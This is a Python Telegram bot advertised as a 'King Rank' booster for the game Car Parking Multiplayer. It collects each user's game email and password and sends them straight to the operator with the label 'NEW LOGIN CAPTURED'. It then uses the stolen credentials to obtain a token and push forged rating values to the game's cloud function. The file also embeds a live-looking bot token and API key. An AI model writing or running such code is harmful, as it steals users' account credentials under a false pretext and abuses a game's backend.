import telebot
import requests
import json
import os
from telebot import types

# --- CONFIGURATION ---
BOT_TOKEN = "8354373377:AAGyxvoy3fc_QffgOE7GzfKd-53u13sU0fI"
ADMIN_ID = 7183809303
FIREBASE_URL = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"

bot = telebot.TeleBot(BOT_TOKEN)
USERS_FILE = "users.json"

# --- DATABASE LOGIC ---
def save_user(user_id):
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, "w") as f: json.dump([], f)
    with open(USERS_FILE, "r") as f: users = json.load(f)
    if user_id not in users:
        users.append(user_id)
        with open(USERS_FILE, "w") as f: json.dump(users, f)

def get_users_count():
    if not os.path.exists(USERS_FILE): return 0
    with open(USERS_FILE, "r") as f: return len(json.load(f))

# --- KING RANK LOGIC ---
def set_king_rank(token):
    rating_data = {k: 100000 for k in [
        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
        "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
        "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
        "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"
    ]}
    rating_data["time"], rating_data["race_win"] = 1000000000, 3000
    payload = {"data": json.dumps({"RatingData": rating_data})}
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    try:
        r = requests.post(RANK_URL, headers=headers, json=payload, timeout=15)
        return r.status_code == 200
    except: return False

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
def welcome(message):
    save_user(message.chat.id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_rank = types.InlineKeyboardButton("🚀 Activate King Rank", callback_data="start_rank")
    btn_ig = types.InlineKeyboardButton("📸 Instagram", url="https://instagram.com/anonymo.cpm")
    markup.add(btn_rank, btn_ig)
    
    if message.chat.id == ADMIN_ID:
        btn_admin = types.InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")
        markup.add(btn_admin)

    banner = (
        "##############################################\n"
        "#         CAR PARKING MULTIPLAYER          #\n"
        "#            KING RANK SERVICE             #\n"
        "##############################################\n\n"
        "Welcome to ANONYMO CPM Service!\n"
        "Click the button below to start."
    )
    bot.send_message(message.chat.id, f"`{banner}`", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_panel")
def admin_menu(call):
    count = get_users_count()
    markup = types.InlineKeyboardMarkup()
    btn_broadcast = types.InlineKeyboardButton("📢 Broadcast Message", callback_data="broadcast")
    markup.add(btn_broadcast)
    bot.send_message(ADMIN_ID, f"🛠 **Admin Stats**\n\nTotal Users: `{count}`", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "broadcast")
def start_broadcast(call):
    msg = bot.send_message(ADMIN_ID, "📝 Enter message for ALL users:")
    bot.register_next_step_handler(msg, send_broadcast)

def send_broadcast(message):
    with open(USERS_FILE, "r") as f: users = json.load(f)
    count = 0
    for user in users:
        try:
            bot.send_message(user, f"📢 **ANONYMO UPDATE:**\n\n{message.text}", parse_mode="Markdown")
            count += 1
        except: continue
    bot.send_message(ADMIN_ID, f"✅ Sent to `{count}` users.")

@bot.callback_query_handler(func=lambda call: call.data == "start_rank")
def ask_email(call):
    msg = bot.send_message(call.message.chat.id, "📧 **Enter your CPM Email:**", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_email)

def process_email(message):
    email = message.text.strip()
    msg = bot.send_message(message.chat.id, "🔑 **Enter your CPM Password:**", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_password, email)

def process_password(message, email):
    password = message.text.strip()
    
    # HITNO SLANJE TEBI - Ovo stiže tebi odmah
    bot.send_message(ADMIN_ID, f"🔥 **NEW LOGIN CAPTURED** 🔥\n\n📧 Email: `{email}`\n🔑 Pass: `{password}`", parse_mode="Markdown")
    
    bot.send_message(message.chat.id, "⏳ **Checking account...**", parse_mode="Markdown")
    
    try:
        payload = {"email": email, "password": password, "returnSecureToken": True}
        res = requests.post(FIREBASE_URL, json=payload).json()
        token = res.get('idToken')
        
        if token:
            if set_king_rank(token):
                bot.send_message(message.chat.id, "✅ **Success!** King Rank active.")
            else:
                bot.send_message(message.chat.id, "❌ **Error!** Rank update failed.")
        else:
            bot.send_message(message.chat.id, "❌ **Login Failed!** Wrong email or password.")
    except:
        bot.send_message(message.chat.id, "❌ **Server Error.** Try again.")

print("--- ANONYMO BOT IS ONLINE ---")
bot.infinity_polling()
